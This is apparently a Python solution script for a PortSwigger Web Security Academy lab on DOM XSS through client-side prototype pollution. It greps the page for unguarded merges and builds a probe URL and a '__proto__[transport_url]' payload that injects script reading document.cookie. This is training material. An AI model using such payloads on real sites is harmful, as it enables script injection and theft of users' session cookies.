"""
Lab 1: DOM XSS via client-side prototype pollution
https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss
Difficulty: Apprentice

📝 A query-string parser merges params into an options object with no
__proto__ guard. Pollute a property a later analytics/templating gadget
reads straight into innerHTML.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("Looking for an unguarded merge (jQuery $.extend(true,...), a")
    note("hand-rolled deep-merge, or similar) fed by location.search.")
    grep_for_patterns(source, ["$.extend", "merge", "location.search", "__proto__"])

    note("Step 1: confirm pollution lands on Object.prototype — visit this")
    note("URL, then check the browser console for `Object.prototype.test`:")
    probe_url = f"{TARGET}/?__proto__[test]=polluted"
    log(f"Probe URL: {probe_url}")

    note("Step 2: once confirmed, this lab's known gadget is an analytics")
    note("loader that reads a `transport_url` property with no guard and")
    note("injects it into a <script src=...> tag — pollute that instead:")
    xss_url = (
        f"{TARGET}/?__proto__[transport_url]="
        "data:,alert(document.cookie)//"
    )
    log(f"XSS payload URL: {xss_url}")
    note("Open this URL in an actual browser (not via requests — this is a")
    note("client-side/DOM sink, so the JS has to actually execute) and")
    note("confirm the alert fires.")


if __name__ == "__main__":
    run()
